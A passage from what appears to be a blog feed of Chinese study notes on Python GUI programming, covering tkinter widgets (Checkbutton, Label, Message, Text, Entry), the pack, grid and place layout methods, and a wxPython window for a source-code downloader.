var=StringVar(), 在所调用的函数中方可分别调用 var.get()方法 取得被选中实例的 onvalue或offvalue值。复选框实例通常还可分别利用 select()、deselect()和 toggle() 方法对其进行选中、清除选中和反选操作。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#简单样例：</span><span class="token keyword">import</span> tkinter<span class="token punctuation">.</span>messagebox<span class="token keyword">import</span> tkintertop <span class="token operator">=</span> tkinter<span class="token punctuation">.</span>Tk<span class="token punctuation">(</span><span class="token punctuation">)</span>CheckVar1 <span class="token operator">=</span> tkinter<span class="token punctuation">.</span>IntVar<span class="token punctuation">(</span><span class="token punctuation">)</span>CheckVar2 <span class="token operator">=</span> tkinter<span class="token punctuation">.</span>IntVar<span class="token punctuation">(</span><span class="token punctuation">)</span>C1 <span class="token operator">=</span> tkinter<span class="token punctuation">.</span>Checkbutton<span class="token punctuation">(</span>top<span class="token punctuation">,</span> text<span class="token operator">=</span><span class="token string">"RUNOOB"</span><span class="token punctuation">,</span> variable<span class="token operator">=</span>CheckVar1<span class="token punctuation">,</span>onvalue<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> offvalue<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> height<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">,</span>width<span class="token operator">=</span><span class="token number">20</span><span class="token punctuation">)</span>C2 <span class="token operator">=</span> tkinter<span class="token punctuation">.</span>Checkbutton<span class="token punctuation">(</span>top<span class="token punctuation">,</span> text<span class="token operator">=</span><span class="token string">"GOOGLE"</span><span class="token punctuation">,</span> variable<span class="token operator">=</span>CheckVar2<span class="token punctuation">,</span>onvalue<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> offvalue<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> height<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">,</span> width<span class="token operator">=</span><span class="token number">20</span><span class="token punctuation">)</span>C1<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token punctuation">)</span>C2<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token punctuation">)</span>top<span class="token punctuation">.</span>mainloop<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="Python-Tkinter-标签控件（Label）及消息控件（Message）"><a href="#Python-Tkinter-标签控件（Label）及消息控件（Message）" class="headerlink" title="Python Tkinter 标签控件（Label）及消息控件（Message）"></a>Python Tkinter 标签控件（Label）及消息控件（Message）</h4><p>Python Tkinter 标签控件（Label）指定的窗口中显示的文本和图像。如果需要使用一行或多行且不应该被用户更改的标签控件需要用label控件。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">w <span class="token operator">=</span> Label <span class="token punctuation">(</span> master<span class="token punctuation">,</span> option<span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token punctuation">)</span><span class="token comment"># option 可选项内容与Button的可选项内容相近，但也有wraplength（标签文本显示行数）</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#一个简单样例：</span><span class="token keyword">import</span> tkinter <span class="token keyword">as</span> tkroot <span class="token operator">=</span> tk<span class="token punctuation">.</span>Tk<span class="token punctuation">(</span><span class="token punctuation">)</span>w <span class="token operator">=</span> tk<span class="token punctuation">.</span>Label<span class="token punctuation">(</span>root<span class="token punctuation">,</span> text<span class="token operator">=</span><span class="token string">"Hello RUNOOB!"</span><span class="token punctuation">)</span>w<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token punctuation">)</span>root<span class="token punctuation">.</span>mainloop<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>标签（Label）</strong>和 <strong>消息（Message）</strong>：除了单行与多行的不同外，属性和用法基本一致，用于呈现文本信息。</p><p>值得注意的是：属性text通常用于实例在第一次呈现时的固定文本，而如果需要在程序执行后发生变化，则可以使用下列方法之一实现：</p><p>1、用控件实例的configure()方法来改变属性text的值，可使显示的文本发生变化；</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> tkinter<span class="token keyword">import</span> time<span class="token keyword">def</span> <span class="token function">gettime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      timestr <span class="token operator">=</span> time<span class="token punctuation">.</span>strftime<span class="token punctuation">(</span><span class="token string">"%H:%M:%S"</span><span class="token punctuation">)</span> <span class="token comment"># 获取当前的时间并转化为字符串</span>      lb<span class="token punctuation">.</span>configure<span class="token punctuation">(</span>text<span class="token operator">=</span>timestr<span class="token punctuation">)</span>   <span class="token comment"># 重新设置标签文本</span>      root<span class="token punctuation">.</span>after<span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">,</span>gettime<span class="token punctuation">)</span> <span class="token comment"># 每隔1s调用函数 gettime 自身获取时间</span>root <span class="token operator">=</span> tkinter<span class="token punctuation">.</span>Tk<span class="token punctuation">(</span><span class="token punctuation">)</span>root<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token string">'时钟'</span><span class="token punctuation">)</span>lb <span class="token operator">=</span> tkinter<span class="token punctuation">.</span>Label<span class="token punctuation">(</span>root<span class="token punctuation">,</span>text<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">,</span>fg<span class="token operator">=</span><span class="token string">'blue'</span><span class="token punctuation">,</span>font<span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">"黑体"</span><span class="token punctuation">,</span><span class="token number">80</span><span class="token punctuation">)</span><span class="token punctuation">)</span>lb<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token punctuation">)</span>gettime<span class="token punctuation">(</span><span class="token punctuation">)</span>root<span class="token punctuation">.</span>mainloop<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2、先定义一个tkinter的内部类型变量var=StringVar() 的值也可以使显示文本发生变化。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> tkinter<span class="token keyword">import</span> time<span class="token keyword">def</span> <span class="token function">gettime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      var<span class="token punctuation">.</span><span class="token builtin">set</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>strftime<span class="token punctuation">(</span><span class="token string">"%H:%M:%S"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token comment"># 获取当前时间</span>      root<span class="token punctuation">.</span>after<span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">,</span>gettime<span class="token punctuation">)</span>   <span class="token comment"># 每隔1s调用函数 gettime 自身获取时间</span>root <span class="token operator">=</span> tkinter<span class="token punctuation">.</span>Tk<span class="token punctuation">(</span><span class="token punctuation">)</span>root<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token string">'时钟'</span><span class="token punctuation">)</span>var<span class="token operator">=</span>tkinter<span class="token punctuation">.</span>StringVar<span class="token punctuation">(</span><span class="token punctuation">)</span>lb <span class="token operator">=</span> tkinter<span class="token punctuation">.</span>Label<span class="token punctuation">(</span>root<span class="token punctuation">,</span>textvariable<span class="token operator">=</span>var<span class="token punctuation">,</span>fg<span class="token operator">=</span><span class="token string">'blue'</span><span class="token punctuation">,</span>font<span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">"黑体"</span><span class="token punctuation">,</span><span class="token number">80</span><span class="token punctuation">)</span><span class="token punctuation">)</span>lb<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token punctuation">)</span>gettime<span class="token punctuation">(</span><span class="token punctuation">)</span>root<span class="token punctuation">.</span>mainloop<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="Python-Tkinter-文本组件-Text"><a href="#Python-Tkinter-文本组件-Text" class="headerlink" title="Python Tkinter 文本组件 (Text)"></a>Python Tkinter 文本组件 (Text)</h4><img src="C:\Users\888888\AppData\Roaming\Typora\typora-user-images\1657025434153.png"  /><p> 上表位置的取值可为整数，浮点数或END（末尾），例如0.0表示第0列第0行</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> tkinter <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> time<span class="token keyword">import</span> datetime<span class="token keyword">def</span> <span class="token function">gettime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>       s<span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">(</span>datetime<span class="token punctuation">.</span>datetime<span class="token punctuation">.</span>now<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'\n'</span>       txt<span class="token punctuation">.</span>insert<span class="token punctuation">(</span>END<span class="token punctuation">,</span>s<span class="token punctuation">)</span>       root<span class="token punctuation">.</span>after<span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">,</span>gettime<span class="token punctuation">)</span>  <span class="token comment"># 每隔1s调用函数 gettime 自身获取时间</span>root<span class="token operator">=</span>Tk<span class="token punctuation">(</span><span class="token punctuation">)</span>root<span class="token punctuation">.</span>geometry<span class="token punctuation">(</span><span class="token string">'320x240'</span><span class="token punctuation">)</span>txt<span class="token operator">=</span>Text<span class="token punctuation">(</span>root<span class="token punctuation">)</span>txt<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token punctuation">)</span>gettime<span class="token punctuation">(</span><span class="token punctuation">)</span>root<span class="token punctuation">.</span>mainloop<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><strong>输入框（Entry）</strong>：通常作为功能比较单一的接收单行文本输入的控件，虽然也有许多对其中文本进行操作的方法，但通常用的只有取值方法get()和用于删除文本的delete(起始位置，终止位置)，例如：清空输入框为delete(0，END)。</li></ul><h3 id="GUI应用程序类的通常写法"><a href="#GUI应用程序类的通常写法" class="headerlink" title="GUI应用程序类的通常写法"></a>GUI应用程序类的通常写法</h3><p>通过类application组织整个GUI程序，类application及继承了frame，及通过继承拥有了父类的特性。通过构造函数<code>_init_</code>()初始化窗口中的对象，通过createwidgets()方法创建窗口中的对象。</p><p>Frama框架是一个tkinter组件，表示一个矩形的区域。frame一般作为容器使用，可以放置其他组件，从而实现复杂的布局。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> tkinter <span class="token keyword">as</span> tk<span class="token keyword">class</span> <span class="token class-name">Application</span><span class="token punctuation">(</span>tk<span class="token punctuation">.</span>Frame<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> master<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token builtin">super</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>master<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>master <span class="token operator">=</span> master        self<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>create_widgets<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">create_widgets</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>hi_there <span class="token operator">=</span> tk<span class="token punctuation">.</span>Button<span class="token punctuation">(</span>self<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>hi_there<span class="token punctuation">[</span><span class="token string">"text"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"Hello World\n(click me)"</span>        self<span class="token punctuation">.</span>hi_there<span class="token punctuation">[</span><span class="token string">"command"</span><span class="token punctuation">]</span> <span class="token operator">=</span> self<span class="token punctuation">.</span>say_hi        self<span class="token punctuation">.</span>hi_there<span class="token punctuation">.</span>pack<span class="token punctuation">(</span>side<span class="token operator">=</span><span class="token string">"top"</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>quit <span class="token operator">=</span> tk<span class="token punctuation">.</span>Button<span class="token punctuation">(</span>self<span class="token punctuation">,</span> text<span class="token operator">=</span><span class="token string">"QUIT"</span><span class="token punctuation">,</span> fg<span class="token operator">=</span><span class="token string">"red"</span><span class="token punctuation">,</span>                              command<span class="token operator">=</span>self<span class="token punctuation">.</span>master<span class="token punctuation">.</span>destroy<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>quit<span class="token punctuation">.</span>pack<span class="token punctuation">(</span>side<span class="token operator">=</span><span class="token string">"bottom"</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">say_hi</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"hi there, everyone!"</span><span class="token punctuation">)</span>root <span class="token operator">=</span> tk<span class="token punctuation">.</span>Tk<span class="token punctuation">(</span><span class="token punctuation">)</span>app <span class="token operator">=</span> Application<span class="token punctuation">(</span>master<span class="token operator">=</span>root<span class="token punctuation">)</span>app<span class="token punctuation">.</span>mainloop<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="几何管理（控件布局）"><a href="#几何管理（控件布局）" class="headerlink" title="几何管理（控件布局）"></a>几何管理（控件布局）</h3><p>Tkinter控件有特定的几何状态管理方法，管理整个控件区域组织，以下是Tkinter公开的几何管理类：包、网格、位置</p><table><thead><tr><th>几何方法</th><th>描述</th></tr></thead><tbody><tr><td>pack()</td><td>包装；</td></tr><tr><td>grid()</td><td>网格；</td></tr><tr><td>place()</td><td>位置；</td></tr></tbody></table><h4 id="Pack-布局方式："><a href="#Pack-布局方式：" class="headerlink" title="Pack()布局方式："></a>Pack()布局方式：</h4><p>Pack()方法： 是一种简单的布局方法，如果不加参数的默认方式，将按布局语句的先后，以最小占用空间的方式自上而下地排列控件实例，并且保持控件本身的最小尺寸。</p><p>使用pack()方法可设置 fill、side 等属性参数。</p><table><thead><tr><th>pack()函数的属性</th><th>取值的对应意义</th></tr></thead><tbody><tr><td>fill=X/y/BOTH</td><td>允许控件向水平方向、垂直方向或二维伸展填充未被占用控件</td></tr><tr><td>side=left/right/bottom</td><td>表示本控件实例的布局相对于下一个控件实例的方位</td></tr></tbody></table><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> tkinter <span class="token keyword">import</span>  <span class="token operator">*</span>root <span class="token operator">=</span> Tk<span class="token punctuation">(</span><span class="token punctuation">)</span>lbred <span class="token operator">=</span> Label<span class="token punctuation">(</span>root<span class="token punctuation">,</span>text<span class="token operator">=</span><span class="token string">"Red"</span><span class="token punctuation">,</span>fg<span class="token operator">=</span><span class="token string">"Red"</span><span class="token punctuation">,</span>relief<span class="token operator">=</span>GROOVE<span class="token punctuation">)</span>lbred<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token punctuation">)</span>lbgreen <span class="token operator">=</span> Label<span class="token punctuation">(</span>root<span class="token punctuation">,</span>text<span class="token operator">=</span><span class="token string">"绿色"</span><span class="token punctuation">,</span>fg<span class="token operator">=</span><span class="token string">"green"</span><span class="token punctuation">,</span>relief<span class="token operator">=</span>GROOVE<span class="token punctuation">)</span>lbgreen<span class="token punctuation">.</span>pack<span class="token punctuation">(</span>side<span class="token operator">=</span>RIGHT<span class="token punctuation">)</span>lbblue <span class="token operator">=</span> Label<span class="token punctuation">(</span>root<span class="token punctuation">,</span>text<span class="token operator">=</span><span class="token string">"蓝"</span><span class="token punctuation">,</span>fg<span class="token operator">=</span><span class="token string">"blue"</span><span class="token punctuation">,</span>relief<span class="token operator">=</span>GROOVE<span class="token punctuation">)</span>lbblue<span class="token punctuation">.</span>pack<span class="token punctuation">(</span>fill<span class="token operator">=</span>X<span class="token punctuation">)</span>root<span class="token punctuation">.</span>mainloop<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="grid-布局方式："><a href="#grid-布局方式：" class="headerlink" title="grid()布局方式："></a>grid()布局方式：</h4><p><strong>grid()方法</strong>：是基于网格的布局。先虚拟一个二维表格，再在该表格中布局控件实例。由于在虚拟表格的单元中所布局的控件实例大小不一，单元格也没有固定或均一的大小，因此其仅用于布局的定位。pack()方法与grid()方法不能混合使用。<br> <strong>grid()方法常用布局参数如下：</strong></p><ul><li> <strong>column:</strong> 控件实例的起始列，最左边为第0列。</li><li> <strong>columnspan:</strong> 控件实例所跨越的列数，默认为1列。</li><li> <strong>ipadx,ipady:</strong> 控件实例所呈现区域内部的像素数，用来设置控件实例的大小。</li><li> <strong>padx,pady:</strong> 控件实例所占据空间像素数，用来设置实例所在单元格的大小。</li><li> <strong>row:</strong> 控件实例的起始行，最上面为第0行。</li><li> <strong>rowspan:</strong> 控件实例的起始行数，默认为1行。</li></ul><h4 id="place-布局方法："><a href="#place-布局方法：" class="headerlink" title="place()布局方法："></a>place()布局方法：</h4><p><strong>place()方法</strong>：根据控件实例在父容器中的绝对或相对位置参数进行布局。其常用布局参数如下：</p><ul><li><strong>x,y：</strong>控件实例在根窗体中水平和垂直方向上的其实位置（单位为像素）。注意，根窗体左上角为0,0,水平向右，垂直向下为正方向。</li><li><strong>relx,rely：</strong>控件实例在根窗体中水平和垂直方向上起始布局的相对位置。即相对于根窗体宽和高的比例位置，取值在<code>0.0~1.0</code>之间。</li><li><strong>height,width：</strong>控件实例本身的高度和宽度（单位为像素）。</li><li><strong>relheight,relwidth：</strong>控件实例相对于根窗体的高度和宽度比例，取值在<code>0.0~1.0</code>之间。</li><li>利用place()方法配合relx,rely和relheight,relwidth参数所得的到的界面可自适应根窗体尺寸的大小。place()方法与grid()方法可以混合使用。如下例子：利用place()方法排列消息（多行标签）。</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#参考样例：</span><span class="token keyword">from</span> tkinter <span class="token keyword">import</span> <span class="token operator">*</span>root <span class="token operator">=</span> Tk<span class="token punctuation">(</span><span class="token punctuation">)</span>root<span class="token punctuation">.</span>geometry<span class="token punctuation">(</span><span class="token string">'320x240'</span><span class="token punctuation">)</span>msg1 <span class="token operator">=</span> Message<span class="token punctuation">(</span>root<span class="token punctuation">,</span>text<span class="token operator">=</span><span class="token triple-quoted-string string">'''我的水平起始位置相对窗体 0.2，垂直起始位置为绝对位置 80 像素，我的高度是窗体高度的0.4，宽度是200像素'''</span><span class="token punctuation">,</span>relief<span class="token operator">=</span>GROOVE<span class="token punctuation">)</span>msg1<span class="token punctuation">.</span>place<span class="token punctuation">(</span>relx<span class="token operator">=</span><span class="token number">0.2</span><span class="token punctuation">,</span>y<span class="token operator">=</span><span class="token number">80</span><span class="token punctuation">,</span>relheight<span class="token operator">=</span><span class="token number">0.4</span><span class="token punctuation">,</span>width<span class="token operator">=</span><span class="token number">200</span><span class="token punctuation">)</span>root<span class="token punctuation">.</span>mainloop<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Wxpython"><a href="#Wxpython" class="headerlink" title="Wxpython"></a>Wxpython</h2><blockquote><p>Wxpython这个是我最后采用的gui库，倒不是因为有多大去别，主要是我找到了一个自动生成Wxpython的代码段的小程序，我最后选择了wxpython。</p></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding:utf-8 -*-</span><span class="token keyword">import</span> wx<span class="token punctuation">.</span>lib<span class="token punctuation">.</span>agw<span class="token punctuation">.</span>hyperlink <span class="token keyword">as</span> lib_hyperlink<span class="token keyword">import</span> wx<span class="token keyword">class</span> <span class="token class-name">Frame</span><span class="token punctuation">(</span>wx<span class="token punctuation">.</span>Frame<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        wx<span class="token punctuation">.</span>Frame<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> title<span class="token operator">=</span><span class="token string">'网站源代码下载器'</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">800</span><span class="token punctuation">,</span> <span class="token number">300</span><span class="token punctuation">)</span><span class="token punctuation">,</span>name<span class="token operator">=</span><span class="token string">'frame'</span><span class="token punctuation">,</span>style<span class="token operator">=</span><span class="token number">541072384</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>qdck <span class="token operator">=</span> wx<span class="token punctuation">.</span>Panel<span class="token punctuation">(</span>self<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>Centre<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>an1 <span class="token operator">=</span> wx<span class="token punctuation">.</span>Button<span class="token punctuation">(</span>self<span class="token punctuation">.</span>qdck<span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">46</span><span class="token punctuation">)</span><span class="token punctuation">,</span>pos<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">350</span><span class="token punctuation">,</span> <span class="token number">135</span><span class="token punctuation">)</span><span class="token punctuation">,</span>label<span class="token operator">=</span><span class="token string">'下载'</span><span class="token punctuation">,</span>name<span class="token operator">=</span><span class="token string">'button'</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>an1<span class="token punctuation">.</span>SetAuthNeeded<span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>an1<span class="token punctuation">.</span>Bind<span class="token punctuation">(</span>wx<span class="token punctuation">.</span>EVT_BUTTON<span class="token punctuation">,</span>self<span class="token punctuation">.</span>an1_anbdj<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>bjk1 <span class="token operator">=</span> wx<span class="token punctuation">.</span>TextCtrl<span class="token punctuation">(</span>self<span class="token punctuation">.</span>qdck<span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">,</span>pos<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">150</span><span class="token punctuation">,</span> <span class="token number">85</span><span class="token punctuation">)</span><span class="token punctuation">,</span>value<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">,</span>name<span class="token operator">=</span><span class="token string">'text'</span><span class="token punctuation">,</span>style<span class="token operator">=</span><span class="token number">4096</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>bjk1<span class="token punctuation">.</span>SetMaxLength<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>bq1 <span class="token operator">=</span> wx<span class="token punctuation">.</span>StaticText<span class="token punctuation">(</span>self<span class="token punctuation">.</span>qdck<span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">365</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">,</span>pos<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">235</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">,</span>label<span class="token operator">=</span><span class="token string">'请输入需要下载的链接'</span><span class="token punctuation">,</span>name<span class="token operator">=</span><span class="token string">'staticText'</span><span class="token punctuation">,</span>style<span class="token operator">=</span><span class="token number">2321</span><span class="token punctuation">)</span>        bq1_字体 <span class="token operator">=</span> wx<span class="token punctuation">.</span>Font<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">74</span><span class="token punctuation">,</span><span class="token number">90</span><span class="token punctuation">,</span><span class="token number">700</span><span class="token punctuation">,</span><span class="token boolean">False</span><span class="token punctuation">,</span><span class="token string">'Microsoft YaHei UI'</span><span class="token punctuation">,</span><span class="token number">28</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>bq1<span class="token punctuation">.</span>SetFont<span class="token punctuation">(</span>bq1_字体<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>cjljkL1 <span class="token operator">=</span> lib_hyperlink<span class="token punctuation">.</span>HyperLinkCtrl<span class="token punctuation">(</span>self<span class="token punctuation">.</span>qdck<span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">)</span><span class="token punctuation">,</span>pos<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">380</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">,</span>name<span class="token operator">=</span><span class="token string">'staticText'</span><span class="token punctuation">,</span>label<span class="token operator">=</span><span class="token string">'使用说明'</span><span class="token punctuation">,</span>URL<span class="token operator">=</span><span class="token string">'https://im-so-scared-2.gitee.io/shier_jinghuang/'</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>cjljkL1<span class="token punctuation">.</span>SetToolTip<span class="token punctuation">(</span>wx<span class="token punctuation">.</span>ToolTip<span class="token punctuation">(</span><span class="token string">'使用说明'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        cjljkL1_字体 <span class="token operator">=</span> wx<span class="token punctuation">.</span>Font<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">70</span><span class="token punctuation">,</span><span class="token number">90</span><span class="token punctuation">,</span><span class="token number">400</span><span class="token punctuation">,</span><span class="token boolean">True</span><span class="token punctuation">,</span><span class="token string">'Microsoft YaHei UI'</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>cjljkL1<span class="token punctuation">.</span>SetFont<span class="token punctuation">(</span>cjljkL1_字体<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>cjljkL1<span class="token punctuation">.</span>SetForegroundColour<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">an1_anbdj</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>event<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment">#print('an1,按钮被单击')</span>        <span class="token keyword">pass</span><span class="token keyword">class</span> <span class="token class-name">myApp</span><span class="token punctuation">(</span>wx<span class="token punctuation">.</span>App<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span>  <span class="token function">OnInit</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>frame <span class="token operator">=</span> Frame<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>frame<span class="token punctuation">.</span>Show<span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token boolean">True</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app <span class="token operator">=</span> myApp<span class="token punctuation">(</span><span class="token punctuation">)</span>    app<span class="token punctuation">.</span>MainLoop<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> tkinter </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>课程论文-源代码下载器的设计实现</title>
      <link href="/2022/07/05/%E8%AF%BE%E7%A8%8B%E8%AE%BA%E6%96%87-%E6%BA%90%E4%BB%A3%E7%A0%81%E4%B8%8B%E8%BD%BD%E5%99%A8%E7%9A%84%E8%AE%BE%E8%AE%A1%E5%AE%9E%E7%8E%B0/"/>
      <url>/2022/07/05/%E8%AF%BE%E7%A8%8B%E8%AE%BA%E6%96%87-%E6%BA%90%E4%BB%A3%E7%A0%81%E4%B8%8B%E8%BD%BD%E5%99%A8%E7%9A%84%E8%AE%BE%E8%AE%A1%E5%AE%9E%E7%8E%B0/</url>
      
